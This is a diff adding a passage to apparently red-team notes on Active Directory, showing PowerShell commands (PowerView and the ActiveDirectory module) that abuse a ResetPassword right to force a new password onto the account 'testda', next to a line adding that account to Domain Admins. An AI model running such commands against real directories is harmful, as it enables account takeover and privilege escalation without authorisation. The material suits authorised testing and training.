@@ -509,3 +509,23 @@ Add-ADGroupMember -Identity 'Domain Admins' -Members testda
 
 
 
+- Abusing ResetPassword using `PowerView`:
+
+
+
+```powershell
+Set-DomainUserPassword -Identity testda -AccountPassword
+(ConvertTo-SecureString "Password@123" -AsPlainText -
+Force) -Verbose
+```
+
+
+- Using ActiveDirectory Module:
+
+
+
+```
+Set-ADAccountPassword -Identity testda -NewPassword
+(ConvertTo-SecureString "Password@123" -AsPlainText -
+Force) -Verbose
+```
